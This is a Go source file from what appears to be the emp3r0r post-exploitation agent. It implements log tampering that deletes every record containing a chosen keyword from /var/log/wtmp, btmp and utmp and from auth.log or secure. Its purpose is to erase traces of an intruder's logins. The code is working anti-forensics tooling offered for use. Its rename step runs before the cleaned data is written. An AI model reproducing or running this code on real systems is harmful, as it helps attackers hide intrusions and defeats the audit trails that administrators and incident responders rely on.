package agent

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CleanAllByKeyword delete any entries containing keyword in ALL known log files
func CleanAllByKeyword(keyword string) (err error) {
	return fmt.Errorf("deleteXtmpEntry: %v\ndeleteAuthEntry: %v",
		deleteXtmpEntry(keyword), deleteAuthEntry(keyword))
}

// deleteXtmpEntry delete a wtmp/utmp/btmp entry containing keyword
func deleteXtmpEntry(keyword string) (err error) {
	delete := func(path string) (err error) {
		var (
			offset      = 0
			newFileData []byte
		)
		xtmpf, err := os.Open(path)
		if err != nil {
			return fmt.Errorf("Failed to open xtmp: %v", err)
		}
		defer xtmpf.Close()
		xmtpData, err := ioutil.ReadFile(path)
		if err != nil {
			return fmt.Errorf("Failed to read xtmp: %v", err)
		}

		// back up xtmp file
		// err = ioutil.WriteFile(path+".bak", xmtpData, 0664)
		// if err != nil {
		//	return fmt.Errorf("Failed to backup %s: %v", path, err)
		// }

		for offset < len(xmtpData) {
			buf := xmtpData[offset:(offset + 384)]
			if strings.Contains(string(buf), keyword) {
				offset += 384
				continue
			}
			newFileData = append(newFileData, buf...)
			offset += 384
		}

		// save new file as xtmp.tmp, users need to rename it manually, in case the file is corrupted
		newXtmp, err := os.OpenFile(path+".tmp", os.O_CREATE|os.O_RDWR, 0664)
		if err != nil {
			return fmt.Errorf("Failed to open temp xtmp: %v", err)
		}
		defer newXtmp.Close()
		err = os.Rename(path+".tmp", path)
		if err != nil {
			return fmt.Errorf("Failed to replace %s: %v", path, err)
		}

		_, err = newXtmp.Write(newFileData)
		return err
	}

	err = nil
	xtmpFiles := []string{"/var/log/wtmp", "/var/log/btmp", "/var/log/utmp"}
	for _, xtmp := range xtmpFiles {
		if util.IsFileExist(xtmp) {
			e := delete(xtmp)
			if e != nil {
				if err != nil {
					err = fmt.Errorf("DeleteXtmpEntry: %v, %v", err, e)
				} else {
					err = fmt.Errorf("DeleteXtmpEntry: %v", e)
				}
			}
		}
	}
	return err
}

// deleteAuthEntry clean up /var/log/auth or /var/log/secure
func deleteAuthEntry(keyword string) (err error) {
	path := "/var/log/auth.log"
	logData, err := ioutil.ReadFile(path)
	if err != nil {
		path = "/var/log/secure"
		logData, err = ioutil.ReadFile(path)
		if err != nil {
			return fmt.Errorf("No auth log found: %v", err)
		}
	}
	lines := strings.Split(string(logData), "\n")
	var new_content string
	for _, line := range lines {
		if !strings.Contains(line, keyword) {
			new_content += line + "\n"
		}
	}
	return ioutil.WriteFile(path, []byte(new_content), 0644)
}
